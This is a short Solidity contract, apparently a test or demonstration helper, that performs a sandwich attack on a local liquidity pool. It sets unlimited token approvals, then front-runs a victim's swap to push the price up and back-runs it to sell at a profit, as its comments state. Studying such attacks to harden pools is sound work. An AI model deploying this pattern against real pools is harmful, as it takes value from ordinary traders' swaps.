// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {LiquidityPool} from "./LiquidityPool.sol";

interface IERC20Approve {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract SandwichAttacker {
    LiquidityPool public immutable pool;
    address public immutable owner;

    constructor(address _pool, address token0, address token1) {
        pool = LiquidityPool(_pool);
        owner = msg.sender;
        IERC20Approve(token0).approve(_pool, type(uint256).max);
        IERC20Approve(token1).approve(_pool, type(uint256).max);
    }

    function frontRun(uint256 amountIn) external {
        pool.swap(amountIn, 0, 0, block.timestamp); // pushes the price UP ahead of the victim
    }

    function backRun(uint256 token1Balance) external {
        pool.swap(0, token1Balance, 0, block.timestamp); // sells back, pocketing the difference
    }
}
